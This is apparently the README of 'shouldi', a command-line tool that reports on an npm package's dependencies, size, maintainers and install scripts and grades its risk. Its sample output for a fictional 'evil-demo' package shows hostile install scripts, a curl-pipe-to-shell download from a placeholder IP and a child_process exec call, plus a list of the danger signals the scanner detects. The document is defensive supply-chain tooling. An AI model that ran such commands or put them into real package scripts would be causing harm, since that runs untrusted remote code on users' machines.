# shouldi

**Should I install this?** See what a single npm dependency *really* drags in — packages, disk, and the install scripts that run code on your machine — **before** you run `npm install`.

```sh
npx shouldi express
```

```
  should i install express ?

  📦 64 packages added        (28 direct, you asked for 1)
  👤 36 maintainers you'd be trusting
  💾 2.1 MB on disk
  ✓  no install scripts
  🕰  oldest dep last shipped 11y ago — ee-first (25 stale, 2y+)
  ────────────────────────────────────────
  GRADE  C   "some deps haven't shipped in years — may be unmaintained."
  estimate — latest version of each unique dependency
```

You asked for **1** package. You got **64**. That's the npm deal — and most of the time you never look. `shouldi` makes you look, in two seconds, with no install.

---

## Why

Every `npm install` is a trust decision you make blind:

- **You add 1 package, you trust 64** — and **36 maintainers** you've never heard of. Each is code, and a person with publish rights, that ends up in your app.
- **Some run scripts on your machine** the moment they install (`postinstall`, `preinstall`). That's the exact door supply-chain attacks walk through.
- **Some are deprecated or abandoned** — `shouldi` shows the oldest dep's last publish, so "last shipped 11 years ago" stops being a surprise *after* it's in your lockfile.

`shouldi` answers all of that **before** you commit, straight from the npm registry. No install. No `node_modules`. No dependencies of its own.

## The killer feature: it shows you the actual install script

Other tools tell you a package *has* an install script. `shouldi` shows you **the exact command that will run on your machine** — and flags it if it reaches the network, pipes to a shell, evals, or reads your env.

A legit native build looks calm:

```sh
npx shouldi node-sass
```
```
  ⚠  1 package runs code on your machine at install:
     node-sass
       install:     node scripts/install.js
       postinstall: node scripts/build.js
```

A package doing something it shouldn't lights up red:

```
  ⚠  2 packages run code on your machine at install:
     evil-demo 🚨 dynamic-exec, network, pipe-to-shell
       install:     node -e "require('child_process').exec('whoami')"
       postinstall: curl http://198.51.100.9/x.sh | sh
     helper
       postinstall: node build.js
  ────────────────────────────────────────
  GRADE  F   "an install script is flagged for dynamic-exec, network,
              pipe-to-shell — read the command above before you trust it."
```

`npm install` runs these **before any of your own code** — it's the exact door supply-chain attacks walk through. `shouldi` reads the literal command straight from the registry (no install, no tarball download) and scans it for:

`network` · `pipe-to-shell` · `dynamic-exec` · `obfuscation` · `reads-env` · `destructive/recon`

So "I'll just install it" becomes a decision instead of a reflex.

## Usage

```sh
npx shouldi <package>
npx shouldi react
npx shouldi @scope/name
npx shouldi left-pad@1.3.0
```

No flags to learn. Run it, read the card, move on.

### Exit codes (gate it in CI)

| code | meaning |
| ---- | ------- |
| `0`  | grade A–D |
| `2`  | grade **F** — risky |
| `1`  | package not found / network error |

```sh
# fail a PR that tries to add a package graded F
npx shouldi "$NEW_DEP" || exit 1
```

## What the grade means

Starts at 100, loses points for:

- **install scripts** (−8 each) — code that runs on your machine
- **flagged install scripts** (up to −30 each) — scaled by how many danger signals one command trips (network, pipe-to-shell, eval…)
- **deprecated packages** (−6 each)
- **stale packages** (−3 each) — no publish in 2+ years
- **disk weight** (up to −20)
- **dependency count** (up to −20)

Maintainer count and oldest-publish age are shown for context (they're the *who* and *how-fresh* of what you're trusting); they inform the quip but don't directly move the grade.

`A` install with confidence · `B` fine · `C` look closer · `D` heavy · `F` think twice.

## How it works

Hits the npm registry [packument](https://github.com/npm/registry/blob/master/docs/responses/package-metadata.md) endpoint and walks the dependency graph in parallel — one request per unique package, covering deps, size, install scripts, maintainers, and publish dates in a single fetch. Each unique package is counted once, resolved to its latest version — an **estimate** of the shape and risk of what you'd pull in, not a byte-exact lockfile. Nothing is installed and nothing touches disk.

Zero runtime dependencies. Node 18+.

## Install (optional)

`npx shouldi <pkg>` needs no install. If you want it on your PATH:

```sh
npm i -g shouldi
```

## License

MIT
